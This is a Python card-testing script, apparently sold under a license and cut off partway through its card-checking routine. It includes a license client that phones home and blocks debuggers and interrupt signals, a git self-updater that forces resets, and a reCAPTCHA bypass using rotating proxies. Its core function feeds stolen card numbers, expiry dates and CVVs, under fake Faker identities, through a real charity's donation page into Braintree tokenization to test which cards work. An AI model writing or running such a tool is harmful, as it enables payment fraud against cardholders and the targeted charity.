import re
import requests
from typing import Tuple, Optional, List, Union
from urllib.parse import parse_qs
from time import sleep, time
import itertools
import os, threading, sys, json, base64, hashlib, platform, signal, socketio, importlib, pyfiglet, ipaddress
import time
import random
import base64
import queue
import uuid
import itertools
import httpx
from datetime import datetime, timedelta
from typing import Optional, Tuple
from faker import Faker
from requests import Session
import urllib.parse
import urllib3
from pathlib import Path
import subprocess, socket
from typing import Any
from urllib.parse import quote
from typing import Optional, Iterable, Dict, Any, Tuple, List, Callable, cast, Union
from bs4 import BeautifulSoup
from bs4.element import Tag, NavigableString
card_queue = queue.Queue()
MAX_THREADS = 10
try:
    import colorama
    from colorama import Fore, Style
except ImportError as exc:
    raise SystemExit(\
        "colorama belum terinstall. Jalankan: pip install colorama"\
    ) from exc
try:
    import requests
except ImportError as exc:
    raise SystemExit(\
        "requests belum terinstall. Jalankan: pip install requests"\
    ) from exc
try:
    import socketio                        
except ImportError as exc:
    raise SystemExit(\
        "python-socketio belum terinstall. Jalankan: pip install python-socketio"\
    ) from exc
colorama.init(autoreset=True)
\
\
VERIFY_URL = os.getenv("LICENSE_VERIFY_URL", "https://verif.stecu.cloud/api/verify")
SOCKET_URL = os.getenv("LICENSE_SOCKET_URL", "https://verif.stecu.cloud")
DEFAULT_LABEL = os.getenv("LICENSE_LABEL", "VBV")
\
\
\
\
READ_DELAY = int(os.getenv("UI_READ_DELAY", "1"))         
\
\
\
\
\
\
class LC:
    _ansi_re = re.compile(r"\x1b\[[0-9;]*m")
    \
    VERSION = "1.1"
    \
    def __init__(\
        self,\
        label: str,\
        verify_url: str = VERIFY_URL,\
        socket_url: str = SOCKET_URL,\
    ):
        \
        self.label = label
        self.verify_url = verify_url
        self.socket_url = socket_url
        \
\
        self.cache_file = self._cache_file()
        self.device_id = self._device_id()
        self.started_at = int(time.time())                                             
        \
\
        self.license_key: Optional[str] = None
        self.sio: Optional[socketio.Client] = None
        self.thread: Optional[threading.Thread] = None
        \
\
        self.info = {\
            "valid": False,\
            "name": None,\
            "status": None,\
            "expires": None,\
            "ip": None,\
            "country": None,\
        }
        \
        self.support = "Telegram @xqndrs"
        \
\
        self._guard_debugger()
        self._guard_signals()
    def _guard_debugger(self):
        try:
            if sys.gettrace() is not None:
                print(Fore.RED + "Debugger detected. Exit.")
                os._exit(1)
        except Exception:
            pass
    def _guard_signals(self):
        def handler(sig, frame):
            print(Fore.RED + "Signal blocked.")
        for s in (signal.SIGINT, signal.SIGTERM):
            try:
                signal.signal(s, handler)
            except Exception:
                pass
    def _cache_file(self) -> str:
        base = (\
            os.getenv("LOCALAPPDATA") or\
            os.getenv("APPDATA") or\
            os.path.expanduser("~/.cache")\
        )
        os.makedirs(base, exist_ok=True)
        return os.path.join(base, "lc.json")
    def _read_cache(self) -> dict:
        try:
            if os.path.isfile(self.cache_file):
                with open(self.cache_file, "r", encoding="utf-8") as f:
                    return json.load(f) or {}
        except Exception:
            pass
        return {}
    def _write_cache(self, data: dict):
        try:
            with open(self.cache_file, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
        except Exception:
            pass
    def _load_key(self) -> Optional[str]:
        data = self._read_cache()
        licenses = data.get("licenses", {})
        return licenses.get(self.label)
    def _save_key(self, key: str):
        data = self._read_cache()
        licenses = data.get("licenses") or {}
        licenses[self.label] = key
        data["licenses"] = licenses
        self._write_cache(data)
    def _clear_key(self):
        data = self._read_cache()
        licenses = data.get("licenses") or {}
        if self.label in licenses:
            del licenses[self.label]
        if licenses:
            data["licenses"] = licenses
            self._write_cache(data)
        else:
            try:
                os.remove(self.cache_file)
            except Exception:
                pass
    def _device_id(self) -> str:
        raw = f"{platform.system()}::{platform.node()}::{uuid.getnode()}"
        h = hashlib.sha1(raw.encode()).hexdigest()[:20].upper()
        return f"{platform.system()[:3].upper()}-{h}"
    def _public_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            if ipaddress.ip_address(ip).is_global:
                return ip
        except Exception:
            pass
        for url in (\
            "https://api.ipify.org",\
            "https://ifconfig.me/ip",\
            "https://ipinfo.io/ip",\
        ):
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200:
                    ip = r.text.strip()
                    if ipaddress.ip_address(ip).is_global:
                        return ip
            except Exception:
                pass
        return "unknown"
    def _verify_request(self, key: str) -> dict:
        payload = {\
            "key": key,\
            "label": self.label,\
            "device_id": self.device_id,\
        }
        \
        headers = {\
            "User-Agent": f"LC/{self.VERSION}",\
            "X-Client-IP": self._public_ip(),\
        }
        \
        try:
            r = requests.post(\
                self.verify_url,\
                json=payload,\
                headers=headers,\
                timeout=10,\
            )
            \
            if "application/json" not in r.headers.get("content-type", ""):
                return {"error": "Invalid server response"}
            data = r.json()
            data["_http"] = r.status_code
            return data
        except requests.Timeout:
            return {"error": "Request timeout"}
        except requests.ConnectionError:
            return {"error": "Connection error"}
        except Exception as e:
            return {"error": str(e)}
    def _is_valid(self, r: dict) -> tuple[bool, str]:
        if not isinstance(r, dict):
            return False, "Invalid response"
        if r.get("valid") is True:
            return True, ""
        return False, r.get("error") or r.get("message") or "Invalid license"
    def _strip_ansi(self, s: str) -> str:
        return self._ansi_re.sub("", s)
    def _p(self, msg: str, color=None, pause: bool = False, seconds: Optional[float] = None):
        try:
            if color:
                print(color + msg + Style.RESET_ALL)
            else:
                print(msg)
            if pause:
                time.sleep(seconds if seconds is not None else READ_DELAY)
        except Exception:
            pass
    def inline(self, fields=("Product", "Status", "Expire"), color: bool = True) -> str:
        \
        data = {\
            "Name": self.info.get("name") or "-",\
            "Product": self.label,\
            "Key": self._mask(self.license_key or ""),\
            "Status": (self.info.get("status") or "-").upper(),\
            "Expire": self.info.get("expires") or "-",\
            "Device": self.device_id or "-",\
        }
        \
\
        def cs(v: str) -> str:
            val = (v or "-").upper()
            if not color:
                return val
            if val.startswith("ACTIVE"):
                return Fore.GREEN + val + Style.RESET_ALL
            if "EXPIRE" in val:
                return Fore.RED + val + Style.RESET_ALL
            return Fore.YELLOW + val + Style.RESET_ALL
        parts = []
        for f in fields:
            if f not in data:
                continue
            val = data[f]
            if f == "Status":
                val = cs(val)
            if color:
                parts.append(f"{Fore.LIGHTWHITE_EX}{f}{Style.RESET_ALL}: {val}")
            else:
                parts.append(f"{f}: {val}")
        return " | ".join(parts)
    def render_fields(self, title: str = "License Info", fields=("Product", "Status", "Expire"), min_width: int = 38) -> str:
        \
        data = {\
            "Name": self.info.get("name") or "-",\
            "Product": self.label,\
            "Key": self._mask(self.license_key or ""),\
            "Status": (self.info.get("status") or "-").upper(),\
            "Expire": self.info.get("expires") or "-",\
            "Device": self.device_id or "-",\
        }
        \
\
        def cs(v: str) -> str:
            val = (v or "-").upper()
            if val.startswith("ACTIVE"):
                return Fore.GREEN + val + Style.RESET_ALL
            if "EXPIRE" in val:
                return Fore.RED + val + Style.RESET_ALL
            return Fore.YELLOW + val + Style.RESET_ALL
        rows = []
        for f in fields:
            if f not in data:
                continue
            v = data[f]
            if f == "Status":
                v = cs(v)
            rows.append((f, v))
        label_w = max(len(k) for k, _ in rows) if rows else 0
        \
        def strip_ansi(s: str) -> str:
            return self._strip_ansi(str(s))
        value_w = max(len(strip_ansi(v)) for _, v in rows) if rows else 0
        inner_width = max(len(title), label_w + 2 + value_w, min_width)
        \
\
        border = "─" * (inner_width + 2)
        out = []
        out.append(Fore.WHITE + "┌" + border + "┐" + Style.RESET_ALL)
        out.append(\
            Fore.WHITE + "│ " + Fore.LIGHTBLUE_EX + title.center(inner_width) + Style.RESET_ALL\
            + Fore.WHITE + " │" + Style.RESET_ALL\
        )
        out.append(Fore.WHITE + "├" + border + "┤" + Style.RESET_ALL)
        \
        for k, v in rows:
            raw_line = f"{k:<{label_w}}: {strip_ansi(v)}"
            pad = inner_width - len(raw_line)
            line = f"{Fore.LIGHTWHITE_EX}{k:<{label_w}}{Style.RESET_ALL}: {v}" + " " * pad
            out.append(Fore.WHITE + "│ " + Style.RESET_ALL + line + Fore.WHITE + " │" + Style.RESET_ALL)
        out.append(Fore.WHITE + "└" + border + "┘" + Style.RESET_ALL)
        return "\n".join(out)
    def __repr__(self) -> str:
        status = (self.info.get("status") or "-").upper()
        exp = self.info.get("expires") or "-"
        return f"<LC label={self.label!r} status={status!r} exp={exp!r} device={self.device_id!r}>"
    def show_inline(self, fields=("Product", "Status", "Expire"), color=True, pause=False):
        self._p(self.inline(fields=fields, color=color), pause=pause)
    def show_box(self, title="License Info", fields=("Product", "Status", "Expire"), pause=True):
        self._ui_box(title, [self.inline(fields=fields, color=True)], min_width=38)
    def _notice(self, msg: str, kind: str = "info", pause: bool = True):
        \
        tag = {"info": "[INFO]", "ok": "[OK]", "warn": "[WARN]", "err": "[ERR]"}.get(kind, "[INFO]")
        col = {\
            "info": Fore.CYAN,\
            "ok":   Fore.GREEN,\
            "warn": Fore.YELLOW,\
            "err":  Fore.RED,\
        }.get(kind, Fore.CYAN)
        self._p(f"{tag} {msg}", color=col, pause=pause)
    def _mask(self, key: str) -> str:
        if not key or "-" not in key:
            return key
        s = key.split("-")
        if len(s) >= 4:
            return f"{s[0]}-{s[1]}-XXXX-XXXX"
        return key
    def _clear(self):
        os.system("cls" if os.name == "nt" else "clear")
    def owner_info_inline(self, color: bool = True) -> str:
        name = self.info.get("name") or "-"
        product = self.label
        status_raw = (self.info.get("status") or "-").upper()
        exp = self.info.get("expires") or "-"
        \
        s = status_raw.lower()
        if s.startswith("active"):
            st_col = Fore.GREEN
        elif "expire" in s:
            st_col = Fore.RED
        else:
            st_col = Fore.YELLOW
        plain = f"{name} | {product} | {status_raw} | Exp: {exp}"
        if not color:
            return plain
        return (\
            f"{Fore.LIGHTBLUE_EX}{name}{Style.RESET_ALL} "\
            f"{Fore.WHITE}|{Style.RESET_ALL} "\
            f"{Fore.CYAN}{product}{Style.RESET_ALL} "\
            f"{Fore.WHITE}|{Style.RESET_ALL} "\
            f"{st_col}{status_raw}{Style.RESET_ALL} "\
            f"{Fore.WHITE}|{Style.RESET_ALL} "\
            f"{Fore.LIGHTBLACK_EX}Exp: {exp}{Style.RESET_ALL}"\
        )
    def render(self, cached: bool = False) -> str:
        title_text = "License Verified (Cache)" if cached else "License Verified"
        \
        rows = [\
            ("Name", self.info.get("name") or "-"),\
            ("Product", self.label),\
            ("Key", self._mask(self.license_key or "")),\
            ("Status", (self.info.get("status") or "-").upper()),\
            ("Expire", self.info.get("expires") or "-"),\
            ("Device", self.device_id or "-"),\
        ]
        \
        def color_status(v: str) -> str:
            val = v.upper()
            if val.startswith("ACTIVE"):
                return Fore.GREEN + val + Style.RESET_ALL
            if "EXPIRE" in val:
                return Fore.RED + val + Style.RESET_ALL
            return Fore.YELLOW + val + Style.RESET_ALL
        label_w = max(len(k) for k, _ in rows)
        \
        def plain_len(s: str) -> int:
            return len(self._strip_ansi(s))
        value_samples = []
        for k, v in rows:
            vv = color_status(v) if k == "Status" else str(v)
            value_samples.append(vv)
        value_w = max(plain_len(v) for v in value_samples)
        \
        inner_width = max(len(title_text), label_w + 2 + value_w, 38)
        \
        border = "─" * (inner_width + 2)
        out = []
        out.append(Fore.WHITE + "┌" + border + "┐" + Style.RESET_ALL)
        out.append(\
            Fore.WHITE + "│ "\
            + Fore.LIGHTBLUE_EX + title_text.center(inner_width) + Style.RESET_ALL\
            + Fore.WHITE + " │" + Style.RESET_ALL\
        )
        out.append(Fore.WHITE + "├" + border + "┤" + Style.RESET_ALL)
        \
        for k, v in rows:
            vv = color_status(v) if k == "Status" else str(v)
            line = f"{Fore.LIGHTWHITE_EX}{k:<{label_w}}{Style.RESET_ALL}: {vv}"
            pad = inner_width - plain_len(f"{k:<{label_w}}: {self._strip_ansi(vv)}")
            out.append(Fore.WHITE + "│ " + Style.RESET_ALL + line + " " * pad + Fore.WHITE + " │" + Style.RESET_ALL)
        out.append(Fore.WHITE + "└" + border + "┘" + Style.RESET_ALL)
        return "\n".join(out)
    def _ui_box(self, title: str, lines: list[str], min_width: int = 38):
        self._clear()
        \
        head = Fore.LIGHTBLUE_EX
        border = Fore.WHITE
        text = Fore.LIGHTWHITE_EX
        \
        plain_title = self._strip_ansi(title)
        plain_lines = [self._strip_ansi(l) for l in lines]
        \
        inner_width = max(len(plain_title), *(len(l) for l in plain_lines), min_width)
        \
        def pad(raw: str, plain: str) -> str:
            return raw + " " * (inner_width - len(plain))
        print(border + "┌" + "─" * (inner_width + 2) + "┐")
        print(border + "│ " + head + plain_title.center(inner_width) + border + " │")
        print(border + "├" + "─" * (inner_width + 2) + "┤")
        for raw, plain in zip(lines, plain_lines):
            print(border + "│ " + text + pad(raw, plain) + border + " │")
        print(border + "└" + "─" * (inner_width + 2) + "┘" + Style.RESET_ALL)
        print()
        \
\
        time.sleep(READ_DELAY)
    def _format_reason(self, raw: Optional[str]) -> str:
        if not raw:
            return "Access revoked"
        s = str(raw).strip()
        s = s.replace("-", "_")
        s = re.sub(r"\s+", "_", s)                                
        s = re.sub(r"[^a-zA-Z0-9_]", "", s)                       
        key = s.lower()
        \
        mapping = {\
            "kicked_by_admin": "Kicked by admin",\
            "kicked_by_admin_delete_db_id": "License deleted by admin",\
            "license_deleted": "License deleted",\
            "license_disabled": "License disabled",\
            "device_kicked": "Device session terminated",\
            "device_kicked_target": "Device session terminated",\
            "access_revoked": "Access revoked",\
            "expired": "License expired",\
            "license_expired": "License expired",\
            "invalid_license": "Invalid license",\
            "kick_oldest": "Oldest device session removed",\
            "enforce_limit": "Session limit enforced",\
            "session_enforced": "Session limit enforced",\
        }
        \
        if key in mapping:
            return mapping[key]
        nice = key.replace("_", " ").strip()
        if not nice:
            return "Access revoked"
        return nice[:1].upper() + nice[1:]
    def _kick(self, payload: dict):
        """
        Handler tunggal untuk segala event 'kick' / 'enforce'.
        Akan keluar jika payload menargetkan device ini atau
        aturan session membatalkan device ini.
        """
        try:
            lic = payload.get("license_key") or payload.get("license")
            dev = payload.get("device_id") or payload.get("device")
            \
\
            if lic and lic != self.license_key:
                return
            if dev and dev != self.device_id:
                return
            keep_id = payload.get("keep_device_id") or payload.get("allowed_device_id")
            if keep_id and keep_id == self.device_id:
                \
                return
            raw_reason = (\
                payload.get("reason")\
                or payload.get("message")\
                or payload.get("msg")\
                or payload.get("status")\
                or payload.get("event")\
                or "access_revoked"\
            )
            reason = self._format_reason(raw_reason)
            \
\
            try:
                self._clear_key()
            except Exception:
                pass
            self._ui_box(\
                "Access Revoked",\
                [\
                    "Status : KICKED",\
                    f"Reason : {reason}",\
                ],\
                min_width=42,\
            )
            \
            os._exit(1)
        except SystemExit:
            raise
        except Exception:
            \
            print(Fore.RED + "Access revoked." + Style.RESET_ALL)
            time.sleep(READ_DELAY)
            os._exit(1)
    def verify(self, attempts: int = 3):
        cached = self._load_key()
        if cached:
            r = self._verify_request(cached)
            ok, _ = self._is_valid(r)
            if ok:
                self._apply_result(cached, r)
                self._clear()
                print(self.render(cached=True))
                self._p(self.owner_info_inline(), pause=True)                
                return
        for attempt in range(1, attempts + 1):
            self._ui_box(\
                "License Verification",\
                [\
                    f"Product : {self.label}",\
                    "Support : t.me/xqndrs",\
                    "",\
                    f"{Fore.YELLOW}Paste your license key{Style.RESET_ALL}",\
                ],\
            )
            \
            try:
                key = input("> License Key : ").strip().upper()
            except KeyboardInterrupt:
                print("\nExit.")
                sys.exit(0)
            r = self._verify_request(key)
            ok, msg = self._is_valid(r)
            \
            if ok:
                self._save_key(key)
                self._apply_result(key, r)
                self._clear()
                print(self.render(cached=False))
                self._notice("License verified. Access granted.", kind="ok", pause=True)
                return
            self._ui_box(\
                "Verification Failed",\
                [\
                    f"Product : {self.label}",\
                    "Status  : Invalid license",\
                    f"Reason  : {msg}",\
                ],\
            )
        self._ui_box(\
            "Access Denied",\
            [\
                f"Product : {self.label}",\
                "Tidak ada license yang valid.",\
                "Aplikasi akan keluar.",\
            ],\
        )
        sys.exit(1)
    def _apply_result(self, key: str, r: dict):
        self.license_key = key
        self.info["valid"] = True
        self.info["name"] = r.get("name")
        self.info["status"] = r.get("status")
        self.info["expires"] = r.get("expires")
    def _socket_loop(self):
        sio = socketio.Client(reconnection=True)
        self.sio = sio
        \
        @sio.event
        def connect():
            sio.emit("register_device", {\
                "license_key": self.license_key,\
                "device_id": self.device_id,\
                "started_at": self.started_at,\
                "label": self.label,\
                "client": f"LC/{self.VERSION}",\
            })
        @sio.event
        def disconnect():
            try:
                sio.emit("device_disconnect", {\
                    "license_key": self.license_key,\
                    "device_id": self.device_id,\
                    "ts": int(time.time()),\
                    "reason": "client_disconnect"\
                })
            except Exception:
                pass
        sio.on("device_kicked", self._kick)
        sio.on("device_kicked_target", self._kick)
        sio.on("license_disabled", self._kick)
        sio.on("license_deleted", self._kick)
        sio.on("kick_oldest", self._kick)
        sio.on("enforce_limit", self._kick)
        sio.on("session_enforced", self._kick)
        sio.on("kick", self._kick)
        \
        try:
            sio.connect(self.socket_url, wait_timeout=10)
            \
            def _heartbeat():
                while True:
                    try:
                        if sio.connected:
                            sio.emit("heartbeat", {\
                                "license_key": self.license_key,\
                                "device_id": self.device_id,\
                                "ts": int(time.time()),\
                                "status": "online"\
                            })
                        time.sleep(30)
                    except Exception:
                        time.sleep(30)
            threading.Thread(target=_heartbeat, daemon=True).start()
            sio.wait()
        except Exception:
            pass
    def start(self, bg=True):
        self.verify()
        \
        if self.thread is None or not self.thread.is_alive():
            self.thread = threading.Thread(\
                target=self._socket_loop,\
                daemon=True\
            )
            self.thread.start()
        if not bg:
            while True:
                time.sleep(1)
def _up():
    def spinner(msg, stop_event):
        spin = itertools.cycle(["|", "/", "-", "\\"])
        while not stop_event.is_set():
            print(f"\r{msg} {next(spin)}", end="", flush=True)
            time.sleep(0.1)
        print("\r" + " " * (len(msg) + 2) + "\r", end="", flush=True)              
    try:
        d = Path(__file__).resolve().parent
        os.chdir(d)
        subprocess.run(\
            ["git", "fetch", "origin"],\
            stdout=subprocess.DEVNULL,\
            stderr=subprocess.DEVNULL,\
        )
        lh = subprocess.check_output(\
            ["git", "rev-parse", "HEAD"], stderr=subprocess.DEVNULL\
        ).strip()
        rh = subprocess.check_output(\
            ["git", "rev-parse", "origin/main"], stderr=subprocess.DEVNULL\
        ).strip()
        if lh != rh:
            stop_event = threading.Event()
            t = threading.Thread(target=spinner, args=("Updating...", stop_event))
            t.start()
            try:
                subprocess.run(\
                    ["git", "reset", "--hard", "origin/main"],\
                    stdout=subprocess.DEVNULL,\
                    stderr=subprocess.DEVNULL,\
                )
                subprocess.run(\
                    ["git", "pull", "--force"],\
                    stdout=subprocess.DEVNULL,\
                    stderr=subprocess.DEVNULL,\
                )
            finally:
                stop_event.set()
                t.join()
            print("Update complete.\n")
            os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception:
        pass
USERAGENTS = [\
    "Mozilla/5.0 (Linux; Android 9; SM-J330FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5923.0 Safari/537.36",\
    "Mozilla/5.0 (Linux; Android 11; K708 Build/RP1A.201105.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6077.0 Safari/537.36",\
    "Mozilla/5.0 (Linux; Android 11; SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6089.3 Safari/537.36",\
    "Mozilla/5.0 (Linux; Android 12; T506D Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.4 Safari/537.36",\
    "Mozilla/5.0 (Linux; Android 12; 220733SG Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6140.0 Safari/537.36",\
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5941.0 Safari/537.36",\
    "Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6051.0 Safari/537.36",\
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6103.0 Safari/537.36",\
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.75 Safari/537.36",\
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6186.0 Safari/537.36",\
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6101.0 Safari/537.36",\
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6400.0 Safari/537.36",\
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6154.0 Safari/537.36",\
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6306.0 Safari/537.36",\
]
\
\
def getstr(text, start_str, end_str):
    try:
        \
        if isinstance(text, bytes):
            text = text.decode("utf-8", errors="ignore")
        else:
            text = str(text)
        start_index = text.index(start_str) + len(start_str)
        end_index = text.index(end_str, start_index)
        return text[start_index:end_index].strip()
    except (ValueError, AttributeError, UnicodeDecodeError):
        return ""
class ProxyRotator:
    def __init__(self, proxies: Optional[Union[str, List[str]]]):
        if isinstance(proxies, str):
            proxies = [proxies]
        self._proxies = itertools.cycle(proxies) if proxies else None
    def get(self) -> Optional[Dict[str, str]]:
        if not self._proxies:
            return None
        proxy = next(self._proxies)
        return {"http": proxy, "https": proxy}
class RecaptchaRequestor:
    def __init__(\
        self, timeout: int = 10, proxies: Optional[Union[str, List[str]]] = None\
    ):
        self.timeout = timeout
        self.proxy_rotator = ProxyRotator(proxies)
        self.base_url = "https://www.google.com/recaptcha"
    def _random_headers(self) -> dict:
        user_agent = random.choice(USERAGENTS)
        return {\
            "Content-Type": "application/x-www-form-urlencoded",\
            "User-Agent": user_agent,\
        }
    def _request(self, method: str, endpoint: str, **kwargs) -> Optional[str]:
        url = f"{self.base_url}/{endpoint}"
        kwargs.setdefault("timeout", self.timeout)
        kwargs["headers"] = self._random_headers()
        kwargs["proxies"] = self.proxy_rotator.get()
        try:
            response = requests.request(method, url, **kwargs)
            response.raise_for_status()
            return response.text
        except requests.RequestException:
            return None
    def fetch_anchor_token(self, api_type: str, params: str) -> Optional[str]:
        return self._request("GET", f"{api_type}/anchor", params=params)
    def fetch_recaptcha_token(\
        self, api_type: str, s_params: dict, payload: str\
    ) -> Optional[str]:
        text = self._request(\
            "POST", f"{api_type}/reload", params={"k": s_params.get("k")}, data=payload\
        )
        if text:
            match = re.search(r'"rresp","(.*?)"', text)
            return match.group(1) if match else None
        return None
class RecaptchaSolverSync:
    MAX_RETRIES = 20
    RETRY_DELAY = 1
    \
    def __init__(\
        self, timeout: int = 10, proxies: Optional[Union[str, List[str]]] = None\
    ):
        self.client = RecaptchaRequestor(timeout=timeout, proxies=proxies)
    @staticmethod
    def _parse_api_type(anchor_url: str) -> Tuple[Optional[str], Optional[str]]:
        match = re.search(r"(api2|enterprise)/anchor\?(.*)", anchor_url)
        return (match.group(1), match.group(2)) if match else (None, None)
    @staticmethod
    def _parse_params(params: str) -> dict:
        parsed = parse_qs(params)
        return {k: v[0] for k, v in parsed.items()}
    @staticmethod
    def _extract_c_value(html: str) -> Optional[str]:
        match = re.search(r'value="(.*?)"', html)
        return match.group(1) if match else None
    @staticmethod
    def _build_payload(s_params: dict, c_value: str) -> str:
        return f"v={s_params.get('v')}&reason=q&c={c_value}&k={s_params.get('k')}&co={s_params.get('co')}"
    def solve(self, anchor_url: str) -> str:
        api_type, param_str = self._parse_api_type(anchor_url)
        if not api_type or not param_str:
            raise ValueError("Invalid anchor URL format.")
        s_params = self._parse_params(param_str)
        \
        for _ in range(self.MAX_RETRIES):
            anchor_token_html = self.client.fetch_anchor_token(api_type, param_str)
            if not anchor_token_html:
                sleep(self.RETRY_DELAY)
                continue
            c_value = self._extract_c_value(anchor_token_html)
            if not c_value:
                sleep(self.RETRY_DELAY)
                continue
            payload = self._build_payload(s_params, c_value)
            token = self.client.fetch_recaptcha_token(api_type, s_params, payload)
            \
            if token:
                return token
            sleep(self.RETRY_DELAY)
        raise RuntimeError("Failed to solve reCAPTCHA after maximum retries.")
def solve_recaptcha_token(\
    anchor_url: str, proxies: Optional[Union[str, List[str]]] = None, timeout: int = 10\
) -> str:
    solver = RecaptchaSolverSync(timeout=timeout, proxies=proxies)
    return solver.solve(anchor_url)
def check_card(session, card, proxy_list=None):
    cc, mm, yy, cvv = card.strip().split("|")
    mm = mm.zfill(2)                           
    \
    yy = str(yy)[-4:].zfill(4)                        
    yy2 = yy[-2:].zfill(2)                      
    bin6 = cc[:6]
    uuid1, uuid2, uuid3, uuid4 = (\
        str(uuid.uuid4()),\
        str(uuid.uuid4()),\
        str(uuid.uuid4()),\
        str(uuid.uuid4()),\
    )
    unix_time = int(time.time())
    unixtime_str = str(unix_time)[-6:]
    fake = Faker()
    firstname = fake.first_name()
    lastname = fake.last_name()
    card_name = fake.name()
    email = fake.free_email()
    fullcard = f"{cc}|{mm}|{yy2}|{cvv}"
    proxies_source = proxy_list or []
    tried = set()
    max_attempts = 10
    attempt = 0
    while attempt < max_attempts:
        attempt += 1
        \
        if proxies_source:
            if len(tried) >= len(proxies_source):
                break
            proxy = random.choice(proxies_source)
            if proxy in tried:
                continue
            tried.add(proxy)
            proxies = {"http": proxy, "https": proxy}
        else:
            proxies = None
        try:
            anchor_url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LeT2LkUAAAAAK9Ap1_HLtwt_BBnyUPbvW8nrRkV&co=aHR0cHM6Ly9kb25hdGUud2Fsa3doZWVsY3ljbGV0cnVzdC5vcmcudWs6NDQz&hl=en&v=TkacYOdEJbdB_JjX802TMer9&size=invisible&anchor-ms=20000&execute-ms=15000&cb=kjmiu0idwj76"
            \
            proxies = proxies if proxies else None
            timeout = 25
            token = solve_recaptcha_token(anchor_url, proxies=proxy_list, timeout=timeout)
            \
            url = f"https://bins.antipublic.cc/bins/{cc[:6]}"
            response = session.get(url)
            resp = response.text
            brand = getstr(resp, 'brand":"', '"') or "UNKNOWN"
            country = (\
                getstr(resp, 'country":"', '"')\
                or getstr(resp, 'country_name":"', '"')\
                or "UNKNOWN"\
            )
            jenis = getstr(resp, 'type":"', '"').upper()
            brand = brand.capitalize()
            country1 = country.upper()
            \
            headers = {\
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",\
                "accept-language": "en-US,en;q=0.6",\
                "cache-control": "no-cache",\
                "pragma": "no-cache",\
                "priority": "u=0, i",\
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",\
            }
            \
            r = session.get(\
                "https://donate.walkwheelcycletrust.org.uk/", headers=headers, timeout=timeout, proxies=proxies,\
            )
            \
            headers = {\
                "accept": "*/*",\
                "accept-language": "en-US,en;q=0.6",\
                "cache-control": "no-cache",\
                "pragma": "no-cache",\
                "priority": "u=1, i",\
                "referer": "https://donate.walkwheelcycletrust.org.uk/",\
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",\
            }
            \
            r = session.get(\
                "https://donate.walkwheelcycletrust.org.uk/api/getSetup",\
                headers=headers, timeout=timeout, proxies=proxies,\
            )
            loqateKey = getstr(r.text, 'loqateKey":"', '"')
            tokenb3 = getstr(r.text, 'token":"', '"')
            decoded_bytes = base64.urlsafe_b64decode(tokenb3)
            decoded_str = decoded_bytes.decode("utf-8", errors="strict")
            merchantID = getstr(decoded_str, 'merchantId":"', '"')
            B3tok = getstr(decoded_str, 'authorizationFingerprint":"', '"')
            \
            headers = {\
                "accept": "*/*",\
                "accept-language": "en-US,en;q=0.6",\
                "authorization": f"Bearer {B3tok}",\
                "braintree-version": "2018-05-10",\
                "cache-control": "no-cache",\
                "content-type": "application/json",\
                "origin": "https://assets.braintreegateway.com",\
                "pragma": "no-cache",\
                "priority": "u=1, i",\
                "referer": "https://assets.braintreegateway.com/",\
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",\
            }
            \
            json_data = {\
                "clientSdkMetadata": {\
                    "source": "client",\
                    "integration": "custom",\
                    "sessionId": uuid1,\
                },\
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",\
                "variables": {\
                    "input": {\
                        "creditCard": {\
                            "number": cc,\
                            "expirationMonth": mm,\
                            "expirationYear": yy,\
                            "cvv": cvv,\
                        },\
                        "options": {\
                            "validate": False,\
                        },\
                    },\
                },\
                "operationName": "TokenizeCreditCard",\
            }
            \
            r = session.post(\
                "https://payments.braintree-api.com/graphql",\
                headers=headers,\
                json=json_data,\
                timeout=timeout,\
                proxies=proxies,\
            )
            tokencc = getstr(r.text, 'token": "', '"') or getstr(\
                r.text, 'token":"', '"'\
            )
            \
            headers = {\
                "accept": "*/*",\
                "accept-language": "en-US,en;q=0.6",\
